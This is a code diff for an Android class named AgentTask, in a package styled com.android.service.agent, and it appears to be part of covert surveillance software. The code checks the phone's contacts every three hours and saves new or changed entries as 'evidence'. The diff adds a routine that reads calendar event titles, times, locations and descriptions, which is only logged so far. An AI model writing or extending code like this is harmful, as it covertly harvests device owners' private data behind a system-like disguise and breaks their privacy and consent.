@@ -11,12 +11,22 @@ package com.android.service.agent;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.List;
 import java.util.ListIterator;
 
+import android.content.ContentResolver;
+import android.content.ContentUris;
+import android.content.Context;
+import android.database.Cursor;
+import android.net.Uri;
+import android.text.format.DateUtils;
+
 import com.android.service.LogR;
+import com.android.service.Status;
 import com.android.service.agent.task.Contact;
 import com.android.service.agent.task.PhoneInfo;
 import com.android.service.agent.task.PickContact;
@@ -52,6 +62,7 @@ public class AgentTask extends AgentBase {
 	 */
 	@Override
 	public void begin() {
+		// every three hours, check.
 		setPeriod(180 * 60 * 1000);
 		setDelay(200);
 
@@ -64,7 +75,7 @@ public class AgentTask extends AgentBase {
 				contacts = (HashMap<Long, Long>) markup.readMarkupSerializable();
 			} catch (final IOException e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (begin): cannot read markup") ;//$NON-NLS-1$
+					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
 				}
 			}
 		}
@@ -91,27 +102,120 @@ public class AgentTask extends AgentBase {
 			}
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (serializeContacts): " + e) ;//$NON-NLS-1$
+				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
 			}
 		}
 	}
 
 	/**
-	 * Every once and then read the contactInfo, and Check.every change. If //$NON-NLS-1$
-	 * something is new the contact is saved.
+	 * Every once and then read the contactInfo, and Check.every change. If
+	 * //$NON-NLS-1$ something is new the contact is saved.
 	 */
 	@Override
 	public void go() {
+		contacts();
+		calendar();
+	}
+
+	private void calendar() {
+		// http://jimblackler.net/blog/?p=151
+		// http://forum.xda-developers.com/showthread.php?t=688095
+
+		HashSet<String> calendars;
+		String contentProvider;
+
+		contentProvider = "content://calendar";
+		calendars = selectCalendars(contentProvider);
+
+		if (calendars == null || calendars.isEmpty()) {
+			contentProvider = "content://com.android.calendar";
+			calendars = selectCalendars(contentProvider);
+		}
+
+		// For each calendar, display all the events from the previous week to
+		// the end of next week.
+		for (String id : calendars) {
+			Uri.Builder builder = Uri.parse(contentProvider + "/instances/when").buildUpon();
+			long now = new Date().getTime();
+			ContentUris.appendId(builder, now - DateUtils.WEEK_IN_MILLIS);
+			ContentUris.appendId(builder, now + DateUtils.WEEK_IN_MILLIS);
+
+			String textUri = builder.build().toString();
+
+			Cursor eventCursor = managedQuery(builder.build(), new String[] { "title", "begin", "end", "allDay",
+					"eventLocation",  "description" }, "Calendars._id=" + id, null,
+					"startDay ASC, startMinute ASC");
+			// For a full list of available columns see
+			// http://tinyurl.com/yfbg76w
+
+			while (eventCursor.moveToNext()) {
+
+				final String title = eventCursor.getString(0);
+				final Date begin = new Date(eventCursor.getLong(1));
+				final Date end = new Date(eventCursor.getLong(2));
+				final Boolean allDay = !eventCursor.getString(3).equals("0");
+
+				final String location = eventCursor.getString(4);
+				//final String syncAccount = eventCursor.getString(5);
+				String syncAccount = "";
+				final String description = eventCursor.getString(5);
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (calendar): Title: " + title + " Begin: " + begin + " End: " + end + " All Day: "
+							+ allDay + " Location: " + location + " SyncAccount:" + syncAccount + " Description: "
+							+ description);
+				}
+			}
+		}
+	}
+
+	private HashSet<String> selectCalendars(String contentProvider) {
+		String[] projection = new String[] { "_id", "displayName", "selected" };
+		// Uri calendars = Uri.parse("content://calendar/calendars");
+		Uri calendars = Uri.parse(contentProvider + "/calendars");
+
+		HashSet<String> calendarIds = new HashSet<String>();
+
+		Cursor managedCursor = managedQuery(calendars, projection, "selected=1", null, null);
+
+		while (managedCursor != null && managedCursor.moveToNext()) {
+
+			final String _id = managedCursor.getString(0);
+			final String displayName = managedCursor.getString(1);
+			final Boolean selected = !managedCursor.getString(2).equals("0");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (selectCalendars): Id: " + _id + " Display Name: " + displayName + " Selected: "
+						+ selected);
+			}
+
+			calendarIds.add(_id);
+		}
+
+		return calendarIds;
+
+	}
+
+	private Cursor managedQuery(Uri calendars, String[] projection, String selection, String[] selectionArgs,
+			String sortOrder) {
+		Context context = Status.getAppContext();
+		ContentResolver contentResolver = context.getContentResolver();
+
+		final Cursor cursor = contentResolver.query(calendars, projection, selection, selectionArgs, sortOrder);
+
+		return cursor;
+	}
+
+	private void contacts() {
 		contact = new PickContact();
 
 		final Date before = new Date();
 		final List<Contact> list = contact.getContactInfo();
 		final Date after = new Date();
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000) ;//$NON-NLS-1$
+			Check.log(TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);//$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (go): list size = " + list.size()) ;//$NON-NLS-1$
+			Check.log(TAG + " (go): list size = " + list.size());//$NON-NLS-1$
 		}
 
 		final ListIterator<Contact> iter = list.listIterator();
@@ -134,7 +238,7 @@ public class AgentTask extends AgentBase {
 			// if does not match, save and serialize
 			if (!crcNew.equals(crcOld)) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (go): new contact. " + c) ;//$NON-NLS-1$
+					Check.log(TAG + " (go): new contact. " + c);//$NON-NLS-1$
 				}
 				contacts.put(c.getId(), crcNew);
 				saveEvidence(c);
@@ -145,7 +249,7 @@ public class AgentTask extends AgentBase {
 
 		if (needToSerialize) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): serialize contacts") ;//$NON-NLS-1$
+				Check.log(TAG + " (go): serialize contacts");//$NON-NLS-1$
 			}
 			serializeContacts();
 		}
@@ -232,10 +336,10 @@ public class AgentTask extends AgentBase {
 				outputStream.write(WChar.getBytes(name, false));
 			} catch (final IOException e) {
 				if (Cfg.DEBUG) {
-					Check.log(e) ;//$NON-NLS-1$
+					Check.log(e);//$NON-NLS-1$
 				}
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (addTypedString): " + e) ;//$NON-NLS-1$
+					Check.log(TAG + " Error (addTypedString): " + e);//$NON-NLS-1$
 				}
 			}
 		}
